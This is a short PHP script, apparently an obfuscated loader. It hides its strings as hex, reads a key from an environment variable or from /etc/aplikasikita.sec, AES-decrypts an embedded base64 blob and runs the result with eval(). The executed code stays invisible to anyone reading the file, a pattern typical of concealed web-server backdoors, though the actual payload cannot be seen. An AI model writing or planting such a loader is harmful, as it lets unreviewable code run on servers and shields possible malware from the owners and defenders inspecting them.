<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('wQ+c1Tx+A3PcRSNJgTDj/A==');

$c=base64_decode(

'ugJtYTBabP5TVGX1mH1f/eiqnGJQ2cgp5m0bd9/Y0q+i00p/q6CH+MhGsDNdkGzBDCODeov/+4/l' .
'llO/zjBr/m7NjZi2o7e8Kcmkb6xbG2X5U0IcJgTx0l4oV6M+AjF2xyMsTYLYYqElsT2+HFRhnMeF' .
'UYgwYdqLGeU6+Vo8U8w5TYyPvbo2eij9KMUZ9zdR1A4kM5yVrINMmAZ2W5UOHHeLwYr1idE6esYV' .
'37jGyNMppBX6SaZmAoOR3OCLK67jqfvVjoOCLF/ZFi4BPt8rKr3Ypo7GQT6gdM5aA1aMomoNbI/E' .
's3Ymj6Wix3mmUSLjkefFPKd7WVffiv/gZrR2FfAW+3t19l642TRNqhkmz/DXfFjF40zp/tbAJzvH' .
'4T+BmLtTWYH9IRGH/n43HC4jSqDSo6oGw9n7a0qvcC9bwtkJCXKq7pBXbPwaGJsPeipR2RhrQp/6' .
'HwbKXip/XNSInXviDIFIiqEcEvN0/a+zRIvOUiHMo1Kvghmsw9zfP0JIa1Eqg6Spd9oQlM6r21hc' .
'NdVnH9dL+VeoTEqslWIKuafG/KDLAg3ioLgdeBSkBETEuHFlZUNjiwfC27DHqBabcbhr5VZrLf/K' .
'gwk39R+9h2eSeCSq8Qe641OjJhPwXgNfjITHx0JsCpkplqNu/MBw5AiQvqR1ABPreLe0ooJtLr/2' .
'mKZRPdSvVCiaZSNEoBUrVnDXGbsS6OFdQCREVNL79Q=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

